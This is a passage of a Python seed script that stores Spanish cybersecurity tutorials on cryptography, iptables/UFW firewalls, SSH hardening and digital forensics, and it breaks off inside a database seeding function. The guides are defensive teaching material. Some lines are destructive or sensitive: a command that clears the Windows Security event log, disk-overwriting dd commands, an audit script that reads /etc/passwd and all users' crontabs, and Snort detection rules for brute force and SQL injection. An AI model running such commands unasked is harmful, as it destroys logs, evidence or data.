  |                                        |
  |------- ClientKeyExchange ------------->|
  |------- ChangeCipherSpec & Finished -->|
  |                                        |
  |<------ ChangeCipherSpec & Finished -----|
  |                                        |
  |===== Conexión encriptada establecida ==|
```

### Verificar Certificados con OpenSSL

```bash
# Verificar certificado de un servidor
openssl s_client -connect www.google.com:443

# Extraer certificado de un servidor
openssl s_client -connect www.google.com:443 -showcerts | openssl x509 -out server.crt

# Verificar cadena de certificados
openssl verify -CAfile ca.crt server.crt
```

---

## Firma Digital

Una firma digital usa la clave privada para "firmar" datos y la pública para verificar.

**Con OpenSSL:**

```bash
# 1. Crear hash del archivo
openssl dgst -sha256 -out document.txt.sha256 document.txt

# 2. Firmar con clave privada
openssl pkeyutl -sign -in document.txt.sha256 -inkey private.key -out document.sig

# 3. Verificar firma con clave pública
openssl pkeyutl -verify -in document.txt.sha256 -sigfile document.sig -inkey public.key -pubin
```

**Con Python:**

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generar claves
private_key = rsa.generate_private_key(65537, 2048)
public_key = private_key.public_key()

# Datos a firmar
data = b"Documento importante"

# Firmar
signature = private_key.sign(
    data,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# Verificar
try:
    public_key.verify(
        signature,
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("Firma válida")
except:
    print("Firma inválida")
```

---

## GPG (GNU Privacy Guard)

GPG es la herramienta estándar para encriptación y firma en Linux.

**Generar claves:**

```bash
gpg --full-generate-key

# Preguntas:
# Kind of key: RSA and RSA
# Key size: 4096
# Validity: 0 (no expiry) o días
# Name: Tu nombre
# Email: tu@email.com
# Comment: (opcional)
# Passphrase: Tu contraseña
```

**Cifrar archivo:**

```bash
# Cifrar para alguien (requiere su clave pública)
gpg --encrypt --recipient "correo@ejemplo.com" archivo.txt
# Genera: archivo.txt.gpg

# Descifrar
gpg --decrypt archivo.txt.gpg > archivo.txt
```

**Firmar archivo:**

```bash
# Crear firma destacada
gpg --clearsign archivo.txt
# Genera: archivo.txt.asc (contiene original + firma)

# Crear firma detachada
gpg --detach-sign archivo.txt
# Genera: archivo.txt.sig (solo firma)

# Verificar firma
gpg --verify archivo.txt.sig archivo.txt
```

**Importar/Exportar claves públicas:**

```bash
# Exportar tu clave pública
gpg --export --armor correo@ejemplo.com > mi_clave_publica.asc

# Importar clave pública de otro
gpg --import clave_publica.asc

# Listar claves
gpg --list-keys
```

---

## Criptografía de Curva Elíptica (ECC)

ECC es más eficiente que RSA para igual nivel de seguridad.

| Algoritmo | Bits | Equivalencia RSA |
|-----------|------|-----------------|
| ECC-256 | 256 | RSA-3072 |
| ECC-384 | 384 | RSA-7680 |
| ECC-521 | 521 | RSA-15360 |

**Con OpenSSL:**

```bash
# Generar clave privada ECC
openssl ecparam -name prime256v1 -genkey -noout -out private_ecc.key

# Generar certificado auto-firmado
openssl req -new -x509 -key private_ecc.key -out cert_ecc.pem -days 365
```

---

## OpenSSL - Herramienta Completa

**Operaciones Comunes:**

```bash
# Generar número aleatorio
openssl rand -hex 16

# Información de certificado
openssl x509 -in cert.pem -text -noout

# Verificar integridad de archivos descargados
sha256sum archivo.tar.gz
# Comparar con hash publicado

# Crear archivo comprimido y cifrado
tar czf - archivo/ | openssl enc -aes-256-cbc -e -out archivo.tar.gz.enc

# Descomprimir
openssl enc -aes-256-cbc -d -in archivo.tar.gz.enc | tar xzf -
```

---

## Checklist de Seguridad Criptográfica

- [ ] Usar AES-256 para encriptación simétrica
- [ ] Usar RSA-2048+ o ECC-256+ para asimétrica
- [ ] Usar SHA-256+ para hashing, NUNCA MD5
- [ ] Usar bcrypt o Argon2 para contraseñas
- [ ] Implementar TLS 1.2+ en comunicaciones
- [ ] Validar certificados X.509
- [ ] Usar HTTPS exclusivamente
- [ ] Gestionar claves privadas de forma segura
- [ ] Implementar rotación de claves
- [ ] Usar salts en hashing
- [ ] Verificar firmas digitales
- [ ] Implementar HMAC para integridad

---

## Recursos

- OpenSSL Documentation: https://www.openssl.org/docs/
- NIST Cryptographic Standards: https://csrc.nist.gov/
- Crypto101: https://www.crypto101.io/
"""

# ─── Guía 4: Firewall, iptables y Seguridad de Red ──────────────────────────

FIREWALL_IPTABLES_CONTENT = """# Guía completa: Firewall, iptables y Seguridad de Red en Linux

## Introducción

Un firewall es una barrera de seguridad de red que controla el tráfico entrante y saliente. En Linux, **iptables** es la herramienta estándar de bajo nivel, mientras que **UFW** (Uncomplicated Firewall) proporciona una interfaz simplificada. Esta guía cubre ambas, junto con hardening de SSH, fail2ban e IDS básico.

## Conceptos Fundamentales de Firewalls

### Stateless vs Stateful

**Stateless Firewall:**
- Examina cada paquete de forma aislada
- No mantiene información de conexiones previas
- Más rápido pero menos flexible
- Ejemplo: iptables sin módulo de conexión

**Stateful Firewall:**
- Rastrea estado de conexiones TCP/UDP
- Recuerda conexiones establecidas
- Permite respuestas a conexiones legítimas
- Ejemplo: iptables con módulo conntrack

---

## iptables - Firewall Avanzado

### Estructura de iptables

iptables organiza reglas en:

1. **Tablas** (mangle, filter, nat)
2. **Chains** (INPUT, OUTPUT, FORWARD)
3. **Reglas** (con matches y targets)

### Tablas Principales

| Tabla | Uso | Chains |
|-------|-----|--------|
| **filter** | Filtrar paquetes | INPUT, OUTPUT, FORWARD |
| **nat** | Traducción de direcciones (NAT) | PREROUTING, POSTROUTING, OUTPUT |
| **mangle** | Modificar paquetes | Todas |

### Chains Principales

- **INPUT**: Tráfico entrante destinado a la máquina local
- **OUTPUT**: Tráfico saliente originado en la máquina local
- **FORWARD**: Tráfico reenviado a través de la máquina

### Instalación y Verificación

```bash
# Verificar iptables está instalado
iptables --version

# Ver tabla de filtrado actual
iptables -L -n
# -L: listar
# -n: no resolver nombres DNS

# Ver tabla filter con números de línea
iptables -L -n --line-numbers

# Ver tabla nat
iptables -t nat -L -n

# Ver tabla mangle
iptables -t mangle -L -n
```

### Reglas Básicas

**Política por defecto:**

```bash
# Ver política actual
iptables -L -n

# Establecer política (DROP es más seguro)
iptables -P INPUT DROP
iptables -P OUTPUT ACCEPT
iptables -P FORWARD DROP
```

**Permitir conexiones ya establecidas:**

```bash
# Permitir tráfico de conexiones establecidas
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Permitir localhost
iptables -A INPUT -i lo -j ACCEPT
```

**Permitir servicios específicos:**

```bash
# Permitir SSH (puerto 22)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Permitir HTTP (puerto 80)
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Permitir HTTPS (puerto 443)
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Permitir DNS (puerto 53, UDP)
iptables -A INPUT -p udp --dport 53 -j ACCEPT
```

**Bloquear todo lo demás:**

```bash
# La política INPUT ya es DROP, pero explícitamente:
iptables -A INPUT -j DROP
```

### Ejemplos Avanzados

**Limitar conexiones SSH (rate limiting):**

```bash
# Máximo 5 conexiones SSH nuevas por minuto
iptables -A INPUT -p tcp --dport 22 -m limit --limit 5/min -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
```

**Proteger contra SYN flood:**

```bash
# Limitar conexiones TCP nuevas
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

**Bloquear IP específica:**

```bash
# Bloquear 192.168.1.50
iptables -A INPUT -s 192.168.1.50 -j DROP

# Bloquear rango de IPs
iptables -A INPUT -s 192.168.1.0/24 -j DROP
```

**NAT (Port Forwarding):**

```bash
# Reenviar puerto 8080 local a 80 remoto (en 192.168.1.100)
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.100:80

# Habilitar forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Guardar y Restaurar Reglas

```bash
# Guardar reglas
iptables-save > /etc/iptables/rules.v4

# Restaurar reglas
iptables-restore < /etc/iptables/rules.v4

# En Debian/Ubuntu, usar iptables-persistent
sudo apt install iptables-persistent

# Guardar automáticamente en /etc/iptables/rules.v4
sudo iptables-save > /etc/iptables/rules.v4
```

### Firewall Script Completo

```bash
#!/bin/bash
# fw.sh - Script de firewall para servidor web seguro

# Variables
SSH_PORT=22
HTTP_PORT=80
HTTPS_PORT=443

# 1. Limpiar reglas anteriores
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# 2. Políticas por defecto (DROP seguro)
iptables -P INPUT DROP
iptables -P OUTPUT ACCEPT
iptables -P FORWARD DROP

# 3. Permitir localhost
iptables -A INPUT -i lo -j ACCEPT

# 4. Permitir conexiones establecidas
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 5. Permitir ICMP (ping) limitado
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 1 -j ACCEPT

# 6. Permitir SSH con rate limiting
iptables -A INPUT -p tcp --dport $SSH_PORT -m limit --limit 5/min -j ACCEPT

# 7. Permitir HTTP y HTTPS
iptables -A INPUT -p tcp --dport $HTTP_PORT -j ACCEPT
iptables -A INPUT -p tcp --dport $HTTPS_PORT -j ACCEPT

# 8. Log de paquetes rechazados (útil para debugging)
iptables -A INPUT -j LOG --log-prefix "[iptables DROP] "
iptables -A INPUT -j DROP

# 9. Guardar
iptables-save > /etc/iptables/rules.v4

echo "Firewall configurado exitosamente"
```

---

## UFW (Uncomplicated Firewall)

UFW es una interfaz más fácil sobre iptables.

### Instalación

```bash
sudo apt install ufw

# Habilitar UFW
sudo ufw enable

# Ver estado
sudo ufw status
```

### Operaciones Básicas

```bash
# Permitir puerto
sudo ufw allow 22/tcp  # SSH
sudo ufw allow 80/tcp  # HTTP
sudo ufw allow 443/tcp # HTTPS

# Negar puerto
sudo ufw deny 23/tcp   # Telnet

# Permitir desde IP específica
sudo ufw allow from 192.168.1.100 to any port 22

# Bloquear IP
sudo ufw deny from 192.168.1.50

# Eliminar regla
sudo ufw delete allow 22/tcp

# Ver reglas con números
sudo ufw status numbered

# Restablecer todo
sudo ufw reset
```

### Configuración Típica para Servidor Web

```bash
# 1. Habilitar UFW
sudo ufw enable

# 2. Permitir SSH
sudo ufw allow 22/tcp

# 3. Permitir HTTP y HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# 4. Permitir DNS (si es DNS server)
sudo ufw allow 53

# 5. Denegar todo lo demás (automático con UFW)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# 6. Ver estado
sudo ufw status verbose
```

---

## fail2ban - Protección contra Ataques de Fuerza Bruta

fail2ban monitorea logs y bloquea IPs tras múltiples intentos fallidos.

### Instalación

```bash
sudo apt install fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

### Configuración Básica

```bash
# Copiar configuración por defecto
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Editar configuración
sudo nano /etc/fail2ban/jail.local
```

**Configuración típica:**

```ini
[DEFAULT]
bantime = 3600          # Bloquear por 1 hora
findtime = 600          # Ventana de tiempo para contar intentos
maxretry = 5            # Máximo 5 intentos fallidos

[sshd]
enabled = true
port = 22
logpath = /var/log/auth.log
maxretry = 5

[sshd-aggressive]
enabled = true
port = 22
logpath = /var/log/auth.log
maxretry = 2            # Más restrictivo

[apache-auth]
enabled = true
logpath = /var/log/apache2/*error.log
port = 80,443

[apache-noscript]
enabled = true
logpath = /var/log/apache2/*error.log
port = 80,443
```

### Comandos de fail2ban

```bash
# Ver jails activos
sudo fail2ban-client status

# Ver IPs bloqueadas en jail "sshd"
sudo fail2ban-client status sshd

# Desbloquear IP
sudo fail2ban-client set sshd unbanip 192.168.1.50

# Ver logs
sudo tail -f /var/log/fail2ban.log
```

---

## Snort - IDS (Intrusion Detection System)

Snort detecta intentos de intrusión analizando tráfico de red.

### Instalación

```bash
sudo apt install snort

# Durante instalación, selecciona:
# Network interface: eth0 (o tu interfaz)
# HOME_NET: [192.168.1.0/24,!192.168.1.1]
```

### Configuración Básica

```bash
# Archivo principal
sudo nano /etc/snort/snort.conf

# Variables importantes:
# HOME_NET [192.168.1.0/24]    # Tu red
# EXTERNAL_NET !$HOME_NET      # Redes externas
# DNS_SERVERS $HOME_NET        # Servidores DNS
```

### Ejecutar Snort

```bash
# Modo IDS (alerta)
sudo snort -i eth0 -c /etc/snort/snort.conf -l /var/log/snort/

# Modo NIDS (network IDS)
sudo snort -i eth0 -c /etc/snort/snort.conf -A full

# Ver alertas
sudo tail -f /var/log/snort/alert
```

### Reglas Básicas

Las reglas de Snort se definen en `/etc/snort/rules/`. Ejemplo:

```
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server,established; content:"SSH"; sid:1000001; rev:1;)

alert tcp any any -> any any (msg:"Possible SQL Injection"; content:"union select"; nocase; sid:1000002; rev:1;)
```

---

## Hardening de SSH

SSH es un servicio crítico. Implementar buenas prácticas es esencial.

### Configuración Segura de SSH

```bash
# Archivo de configuración
sudo nano /etc/ssh/sshd_config
```

**Cambios recomendados:**

```
# 1. Cambiar puerto (evita escaneo automático)
Port 2222

# 2. Prohibir login con contraseña (solo keys)
PasswordAuthentication no
PubkeyAuthentication yes

# 3. Prohibir acceso root
PermitRootLogin no

# 4. Limitar intentos fallidos
MaxAuthTries 3

# 5. Limitar conexiones simultáneas
MaxSessions 5

# 6. Timeout para conexiones inactivas
ClientAliveInterval 300
ClientAliveCountMax 2

# 7. Usar solo protocolos seguros
Protocol 2
HostKey /etc/ssh/ssh_host_ed25519_key

# 8. Usar ciphers fuertes (eliminar débiles)
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com

# 9. Permitir solo usuarios específicos
AllowUsers usuario1 usuario2

# 10. Prohibir comandos vacíos
PermitEmptyPasswords no

# 11. Disable X11
X11Forwarding no

# 12. Usar solo IPv4
AddressFamily inet
```

### Generar y Usar Claves SSH

```bash
# Generar clave SSH (cliente)
ssh-keygen -t ed25519 -C "usuario@ejemplo.com"

# Copiar clave pública a servidor
ssh-copy-id -i ~/.ssh/id_ed25519.pub usuario@servidor.com

# O manualmente
cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Conectar sin contraseña
ssh -p 2222 usuario@servidor.com
```

### Recargar SSH

```bash
# Recargar configuración (sin desconectar clientes)
sudo systemctl reload ssh

# Reiniciar SSH
sudo systemctl restart ssh

# Ver estado
sudo systemctl status ssh
```

---

## nftables - Sucesor Moderno de iptables

nftables es la evolución moderna de iptables con sintaxis más limpia.

```bash
# Instalación
sudo apt install nftables

# Ver tablas
sudo nft list tables

# Crear tabla
sudo nft add table inet filter

# Añadir cadena
sudo nft add chain inet filter input { type filter hook input priority 0 \; }

# Permitir localhost
sudo nft add rule inet filter input iif lo accept

# Permitir SSH
sudo nft add rule inet filter input tcp dport 22 accept

# Guardar configuración
sudo nft list ruleset > /etc/nftables.conf
```

---

## Checklist de Seguridad de Red

- [ ] Firewall configurado con política DROP por defecto
- [ ] SSH en puerto no estándar (ej: 2222)
- [ ] Autenticación SSH por claves, no contraseña
- [ ] fail2ban protegiendo contra fuerza bruta
- [ ] Conexiones limitadas por rate limiting
- [ ] Logs monitoreados activamente
- [ ] IDS/IPS implementado (Snort, Suricata)
- [ ] Servicios no necesarios deshabilitados
- [ ] Firewalls capa 7 (WAF) para aplicaciones web
- [ ] Monitoreo de tráfico anómalo
- [ ] Actualizaciones de seguridad aplicadas

---

## Herramientas Complementarias

| Herramienta | Uso |
|-------------|-----|
| Wireshark | Análisis de tráfico |
| tcpdump | Captura de paquetes línea de comandos |
| Suricata | IDS/IPS moderna (alternativa Snort) |
| netstat | Ver conexiones activas |
| ss | Alternativa moderna a netstat |
| iftop | Monitoreo de ancho de banda |
| nethogs | Ver uso de red por procesos |
"""

# ─── Guía 5: Análisis Forense Digital y Logs ──────────────────────────────

FORENSE_LOGS_CONTENT = """# Guía completa: Análisis Forense Digital y Logs

## Introducción

El análisis forense digital es el proceso de investigación de sistemas comprometidos para identificar qué sucedió, cuándo sucedió y por quién. Es crucial en ciberseguridad y cumplimiento legal. Esta guía cubre principios forenses, herramientas, análisis de logs Linux/Windows y SIEM básico.

## Principios Fundamentales de Análisis Forense

### Cadena de Custodia (Chain of Custody)

La cadena de custodia documenta quién manejó la evidencia en cada momento. Es crítico en investigaciones legales.

**Información a registrar:**

```
┌─────────────────────────────────────────┐
│ CADENA DE CUSTODIA                      │
├─────────────────────────────────────────┤
│ Descripción del item: Disco Duro Servidor│
│ Ubicación original: Servidor en Data    │
│ Fecha/Hora de incautación: 2024-03-15  │
│ Quien lo incautó: Juan García (IT Sec)  │
│ Hash SHA256: a3f4d2e1c...               │
│ Almacenamiento: Bolsa antiestática      │
│ Quien lo pasó: Juan García              │
│ Quien lo recibió: María Pérez (Forense)│
│ Fecha/Hora: 2024-03-15 14:00            │
│ Cambios: Ninguno                        │
└─────────────────────────────────────────┘
```

### Preservación de Evidencia

1. **No modificar datos**: Usar herramientas forenses especiales
2. **Crear imagen forense**: Copia bit-a-bit del dispositivo
3. **Verificar integridad**: Usando SHA-256 hashes
4. **Documentar todo**: Incluyendo fecha, hora, ejecutante
5. **Almacenar de forma segura**: Protegido del acceso no autorizado

---

## Herramientas Forenses Esenciales

### dd - Creación de Imagen Forense

**Crear imagen completa del disco:**

```bash
# Listar discos/particiones
sudo fdisk -l
sudo lsblk

# Crear imagen de disco completo (como root)
sudo dd if=/dev/sda of=/mnt/forense/imagen_disco.dd bs=4M status=progress

# if=input file (origen)
# of=output file (destino)
# bs=block size (4M es buena velocidad)
# status=progress muestra avance
```

**Crear imagen de una partición específica:**

```bash
sudo dd if=/dev/sda1 of=/mnt/forense/imagen_particion.dd bs=4M status=progress
```

**Restaurar desde imagen:**

```bash
sudo dd if=/mnt/forense/imagen_disco.dd of=/dev/sdb bs=4M status=progress
```

### Verificación de Integridad con SHA256sum

```bash
# Crear hash de archivo original
sha256sum archivo_original > archivo.sha256

# Verificar integridad
sha256sum -c archivo.sha256

# Hash de imagen forense
sha256sum /mnt/forense/imagen_disco.dd > imagen.sha256

# Verificar posteriormente
sha256sum -c imagen.sha256
```

### md5deep / hashdeep - Hashing Recursivo

```bash
sudo apt install hashdeep

# Crear hash de todos los archivos en un directorio
hashdeep -r /home > /mnt/forense/home_hashes.txt

# Verificar cambios después de cierto tiempo
hashdeep -r -k /mnt/forense/home_hashes.txt /home
```

---

## Autopsy - Herramienta Forense GUI

Autopsy es una interfaz gráfica para análisis forense (basada en The Sleuth Kit).

### Instalación

```bash
sudo apt install autopsy

# Iniciar Autopsy
autopsy
# Abre navegador en http://localhost:9999
```

### Flujo de Uso

1. **Crear Caso** → Nombre, descripción, investigador
2. **Añadir Evidencia** → Imagen forense (.dd o disco)
3. **Análisis** → Buscar archivos, recuperar borrados, timeline
4. **Reporte** → Generar reporte HTML

### Capacidades

- Análisis de sistema de archivos
- Recuperación de archivos borrados
- Timeline de eventos
- Búsqueda de palabras clave
- Hash lookup de archivos conocidos
- Análisis de metadatos

---

## Análisis de Logs en Linux

### Ubicaciones de Logs Principales

| Archivo | Contenido |
|---------|-----------|
| `/var/log/auth.log` | Autenticación, SSH, sudo |
| `/var/log/syslog` | Eventos generales del sistema |
| `/var/log/kern.log` | Eventos del kernel |
| `/var/log/apache2/access.log` | Peticiones HTTP a Apache |
| `/var/log/apache2/error.log` | Errores Apache |
| `/var/log/nginx/access.log` | Peticiones NGINX |
| `/var/log/nginx/error.log` | Errores NGINX |
| `/var/log/fail2ban.log` | Bloqueos de fail2ban |

### auth.log - Análisis de Autenticación

```bash
# Ver últimos logins exitosos
grep "Accepted" /var/log/auth.log | tail -20

# Ver intentos fallidos de SSH
grep "Failed password" /var/log/auth.log

# Ver intentos de root login
grep "Failed password for root" /var/log/auth.log

# Contar intentos por IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Identificar intentos de fuerza bruta
grep "Failed password" /var/log/auth.log | grep "ssh" | awk -F'[ =]+' '{print $11}' | sort | uniq -c | sort -rn | head -20

# Ver usuarios que han intentado login
grep "Invalid user" /var/log/auth.log

# Ver cambios de contraseña
grep "Changed password for user" /var/log/auth.log
```

**Ejemplo de análisis:**

```bash
# Script para detectar ataques de fuerza bruta
#!/bin/bash
echo "=== Potenciales ataques de fuerza bruta ==="
grep "Failed password" /var/log/auth.log | awk -F'[ =]+' '{print $11}' | sort | uniq -c | awk '$1 > 10 {print $0}'
```

### syslog - Eventos Generales

```bash
# Ver eventos recientes
tail -50 /var/log/syslog

# Buscar errores específicos
grep "error" /var/log/syslog | grep -i "apache"

# Ver reinicios del sistema
grep "reboot\|kernel" /var/log/syslog

# Ver cambios de permisos
grep "chmod" /var/log/syslog

# Ver instalación/desinstalación de paquetes
grep "apt\|dpkg" /var/log/syslog
```

### journalctl - Systemd Logs (Moderno)

```bash
# Ver todos los logs
journalctl

# Últimos 100 líneas
journalctl -n 100

# Logs de hoy
journalctl --since today

# Logs entre fechas
journalctl --since "2024-03-15 08:00:00" --until "2024-03-15 17:00:00"

# Logs de un servicio específico
journalctl -u ssh.service
journalctl -u apache2.service

# Logs de prioridad error o superior
journalctl -p err

# Ver en tiempo real (como tail -f)
journalctl -f

# Exportar a archivo
journalctl > /tmp/logs.txt
```

### Herramienta de Análisis Rápido

```bash
#!/bin/bash
# analyze_security.sh - Script de análisis de seguridad rápido

echo "=== ANÁLISIS DE SEGURIDAD ==="
echo ""

echo "1. Usuarios del sistema:"
cat /etc/passwd | awk -F: '{print $1, "UID:", $3}'
echo ""

echo "2. Usuarios con shell bash:"
grep bash /etc/passwd
echo ""

echo "3. Cambios recientes de permisos (últimas 24h):"
find / -perm /6000 -mtime -1 2>/dev/null
echo ""

echo "4. Top 5 IPs con conexiones SSH fallidas:"
grep "Failed password" /var/log/auth.log 2>/dev/null | awk -F'[ =]+' '{print $11}' | sort | uniq -c | sort -rn | head -5
echo ""

echo "5. Archivos setuid creados recientemente:"
find / -type f -perm /4000 -mtime -7 2>/dev/null
echo ""

echo "6. Procesos escuchando en puertos:"
netstat -tuln 2>/dev/null || ss -tuln
echo ""

echo "7. Tareas cron sospechosas:"
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null || echo "Sin cron"; done
```

---

## Análisis de Logs en Windows

### Event Viewer - Visor de Eventos

**IDs de eventos críticos en Security (Event ID):**

| ID | Descripción | Severidad |
|----|-------------|-----------|
| 4624 | Login exitoso | Info |
| 4625 | Login fallido | Warning |
| 4720 | Cuenta de usuario creada | Critical |
| 4722 | Cuenta habilitada | Critical |
| 4732 | Usuario añadido a grupo | Critical |
| 4733 | Usuario removido de grupo | Critical |
| 4740 | Cuenta de usuario bloqueada | Critical |
| 4728 | Usuario añadido a grupo privilegiado | Critical |

**Acceder a Event Viewer:**

```
1. Iniciar → "Event Viewer"
2. O: mmc eventvwr.msc
```

### PowerShell - Análisis de Logs

```powershell
# Ver últimos logins exitosos
Get-EventLog -LogName Security -InstanceId 4624 -Newest 20

# Ver intentos de login fallidos
Get-EventLog -LogName Security -InstanceId 4625

# Contar intentos fallidos por usuario
Get-EventLog -LogName Security -InstanceId 4625 | Group-Object -Property "ReplacementStrings[0]" | Sort-Object -Property Count -Descending

# Ver cambios en el sistema (creación de cuentas)
Get-EventLog -LogName Security -InstanceId 4720

# Timeline de eventos
Get-EventLog -LogName Security | Sort-Object -Property TimeGenerated | ForEach-Object {
    Write-Host "$($_.TimeGenerated) - Event $($_.EventID): $($_.Message)"
}

# Exportar logs a CSV
Get-EventLog -LogName Security | Export-Csv -Path "C:\logs\security_export.csv"
```

### Comandos de línea de comandos (CMD)

```batch
REM Ver logs de autenticación
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text

REM Ver intentos fallidos
wevtutil qe Security /q:"*[System[(EventID=4625)]]" /f:text

REM Ver creación de cuentas
wevtutil qe Security /q:"*[System[(EventID=4720)]]" /f:text

REM Exportar a XML
wevtutil epl Security C:\logs\security.xml

REM Limpiar logs (CUIDADO)
wevtutil cl Security
```

---

## SIEM - Security Information and Event Management

SIEM centraliza la recopilación y análisis de logs de múltiples fuentes.

### Elastic Stack (ELK) - Introducción

Elastic Stack es la solución SIEM más popular (open source).

**Componentes:**

1. **Elasticsearch**: Base de datos de búsqueda (almacena logs)
2. **Logstash**: Procesador de logs (filtra, transforma)
3. **Kibana**: Visualización (dashboards, alertas)
4. **Beats**: Agentes livianos (recopilan datos)

### Instalación Básica en Linux

```bash
# 1. Instalar Java (dependencia)
sudo apt install default-jre

# 2. Descargar Elasticsearch
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.0.0-linux-x86_64.tar.gz
tar -xzf elasticsearch-8.0.0-linux-x86_64.tar.gz
cd elasticsearch-8.0.0

# 3. Iniciar Elasticsearch
./bin/elasticsearch

# 4. Instalar Kibana (en otra terminal)
wget https://artifacts.elastic.co/downloads/kibana/kibana-8.0.0-linux-x86_64.tar.gz
tar -xzf kibana-8.0.0-linux-x86_64.tar.gz
cd kibana-8.0.0

# 5. Iniciar Kibana
./bin/kibana

# Acceder a Kibana en http://localhost:5601
```

### Ejemplo de Configuración de Logstash

```
input {
  file {
    path => "/var/log/auth.log"
    start_position => "beginning"
  }
}

filter {
  grok {
    match => { "message" => "%{SYSLOGLINE}" }
  }

  if [type] == "ssh" and [action] == "Failed" {
    mutate { add_tag => [ "ssh_attack" ] }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "linux-logs-%{+YYYY.MM.dd}"
  }
}
```

### Filebeat - Recopilación de Logs

```bash
# Instalar Filebeat
wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.0.0-linux-x86_64.tar.gz
tar -xzf filebeat-8.0.0-linux-x86_64.tar.gz

# Configurar
nano filebeat.yml
```

**Configuración básica:**

```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/syslog

output.elasticsearch:
  hosts: ["localhost:9200"]

processors:
  - add_docker_metadata: ~
  - add_kubernetes_metadata: ~
```

---

## Detección de Anomalías

### Buscar Archivos Recientemente Modificados

```bash
# Archivos modificados en últimas 24 horas
find / -mtime -1 -type f 2>/dev/null | head -50

# Archivos accedidos recientemente
find / -atime -1 -type f 2>/dev/null

# Archivos modificados en últimas 2 horas
find / -mmin -120 -type f 2>/dev/null
```

### Detección de Rootkits

```bash
# Instalar Rootkit Hunter
sudo apt install rkhunter

# Ejecutar scan
sudo rkhunter --check --skip-keypress

# Ver reporte
sudo rkhunter --report
```

### Análisis de Procesos Maliciosos

```bash
# Ver procesos ejecutándose
ps aux

# Procesos sin padre (huérfanos - potencialmente maliciosos)
ps -ef | awk 'NR > 1 && $3 == 1'

# Procesos escondidos
ps aux | awk '{print $2}' > /tmp/ps_pids.txt
ls /proc | grep "^[0-9]" | grep -v -f /tmp/ps_pids.txt

# Ver conexiones de red por proceso
netstat -tlnp
ss -tlnp
```

---

## Timeline Forense

Crear timeline de eventos es crítico para entender la secuencia de un incidente.

```bash
#!/bin/bash
# create_timeline.sh

echo "=== TIMELINE DE EVENTOS ==="
echo ""

# Combinar múltiples logs ordenados por tiempo
(
  grep -H "" /var/log/auth.log /var/log/syslog 2>/dev/null | \\
  awk -F: '{print $1 ":" $2}' | \\
  sed 's/Jan/01/;s/Feb/02/;s/Mar/03/;s/Apr/04/;s/May/05/;s/Jun/06/;s/Jul/07/;s/Aug/08/;s/Sep/09/;s/Oct/10/;s/Nov/11/;s/Dec/12/'
) | sort

# Guardar en archivo
echo "Timeline guardado en timeline.txt"
```

---

## Checklist de Análisis Forense

- [ ] Establecer cadena de custodia apropiada
- [ ] Crear imagen bit-a-bit completa
- [ ] Verificar integridad con SHA-256
- [ ] Analizar logs de autenticación (/var/log/auth.log)
- [ ] Analizar logs del sistema (/var/log/syslog)
- [ ] Búsqueda de archivos sospechosos recientemente modificados
- [ ] Análisis de procesos en ejecución
- [ ] Timeline de eventos completo
- [ ] Búsqueda de malware/rootkits
- [ ] Análisis de conexiones de red
- [ ] Documentar todos los hallazgos
- [ ] Generar reporte profesional

---

## Herramientas Adicionales

| Herramienta | Uso |
|-------------|-----|
| volatility | Análisis forense de memoria |
| scalpel | Carving de archivos (recuperar borrados) |
| photorec | Recuperación de archivos |
| foremost | File carving y recuperación |
| exiftool | Análisis de metadatos |
| strings | Extrae texto legible de binarios |

---

## Recursos

- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- SANS Incident Handler's Handbook: Guía completa
- Autopsy Docs: https://www.sleuthkit.org/autopsy/
- Elastic Stack Docs: https://www.elastic.co/guide/
"""


# ─── Seed Function ────────────────────────────────────────────────────────────

def seed():
    from database import TheorySubject, TheoryPost

    db = SessionLocal()
    try:
        # Check if subject already exists
        subject = db.query(TheorySubject).filter(
            TheorySubject.slug == "ciberseguridad"
        ).first()

        if not subject:
            subject = TheorySubject(
                name="Ciberseguridad",
                slug="ciberseguridad",
                description="Fundamentos de ciberseguridad, pentesting, criptografía, firewalls, análisis forense y auditoría de seguridad.",
                icon="🔐",
                order_index=6,
            )
            db.add(subject)
            db.flush()
            print(f"\n✅  Subject creado: Ciberseguridad")
        else:
            print(f"\nℹ️   Subject ya existe: Ciberseguridad (id={subject.id})")

        # Define guides
        guides = [
            {
